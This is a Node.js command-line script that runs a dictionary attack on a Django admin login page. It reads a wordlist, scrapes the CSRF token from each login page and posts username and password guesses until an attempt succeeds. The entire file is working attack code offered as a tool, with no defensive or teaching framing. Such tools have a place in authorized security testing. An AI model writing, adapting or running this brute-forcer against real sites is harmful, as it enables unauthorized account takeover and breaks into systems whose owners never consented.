#! /usr/bin/env node

// Module Dependencies
var request = require('request');
var fs      = require('fs');
var async   = require('async');

// Usage message
if (process.argv.length !== 5) {
  console.log(
    'NodeJS Django Admin Login Bruteforce 1.0\n' +
    'Usage: ./djangoAdmin.js <username> <wordlist> <target url>' 
  );

  process.exit();
}

// Set user, filepath, url from CLI args
var USERNAME = process.argv[2];
var FILEPATH = process.argv[3];
var BASE_URL = process.argv[4];

// Set regexp to define CSRF and login errors
var CSRF    = /<input type='hidden' name='csrfmiddlewaretoken' value='(.*)' \/>/;
var ERROR_1 = /Please enter the correct username/ ;
var ERROR_2 = /Please correct the error below/;

// Configure the CSRF token request
var csrfOptions = {
  port: 8000,
  url: BASE_URL,
  method: 'GET',
  headers: {}
};

// Define function to extract CSRF token
var getCSRF = function(callback) {
  request(csrfOptions, function (error, response, body) {
    if (!error && response.statusCode == 200) {
      callback(body.match(CSRF)[1]);
    }
  });
};

// Configure the login request
var loginOptions = function(user, password, csrfToken) {
  return {
    port: 8000,
    url: BASE_URL + '/login/',
    method: 'POST',
    headers: { 
      Referer: BASE_URL,
      Cookie: 'csrftoken=' + csrfToken 
    },
    form: {
      csrfmiddlewaretoken: csrfToken,
      username: user,
      password: password,
      next: '/admin/'
    }
  };
};

var tryLogin = function(user, password, callback) {

  getCSRF(function(token) {
    var opt = loginOptions(user, password, token);

    // Send a login POST
    request(opt, function (error, response, body) {
      if (!error) {
        // If we match known regex password is incorrect
        if ( response.statusCode === 200 && (body.match(ERROR_1) || body.match(ERROR_2))) {
          console.log('[-] Invalid: ' + password);
        } else if (response.statusCode < 500) {
          console.log(
            '[+] FOUND: ' + password  +
            '\n[+] Shutting down....' 
          );

          process.exit();
        } else {
          console.log('[-] Server responded with: ' + response.statusCode);
        }
      }
      
      callback();
    });
  });
}

// Function to try each word in an array
var dictionaryAttack = function(words) {
  async.each(words, function(word, done) {
    tryLogin(USERNAME, word, done);
  });
};

// =====================================================================
//  MAIN ===============================================================
// =====================================================================

fs.readFile(FILEPATH, function(err, data) {
  var words = data.toString().split('\n');
  
  console.log('[+] Starting bruteforce...');
  dictionaryAttack(words);
});




